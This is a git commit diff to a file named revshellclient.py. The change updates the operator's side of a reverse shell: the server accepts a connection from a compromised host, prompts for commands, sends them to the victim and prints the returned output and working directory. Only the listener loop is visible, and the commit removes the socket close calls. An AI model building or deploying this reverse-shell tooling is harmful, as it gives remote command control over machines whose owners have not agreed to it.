4b9cbdbca0ec5a6b327d7c2412fe9a08f09f91f6
knoxoxen <149332086+knoxoxen@users.noreply.github.com>
2024-09-14 08:59:41 -0600

    Update revshellclient.py

--- revshellclient.py
+++ revshellclient.py
@@ -12,14 +12,20 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
-
 while True:
-    command = input("Enter command: ")
+# get the command from prompt
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        # empty command
+        continue
+    # send the command to the client
     client_socket.send(command.encode())
     if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
         break
-    result = client_socket.recv(BUFFER_SIZE).decode()
-    print(result)
-
-client_socket.close()
-s.close()
+    # retrieve command results
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    # split command output and current directory
+    results, cwd = output.split(SEPARATOR)
+    # print output
+    print(results)
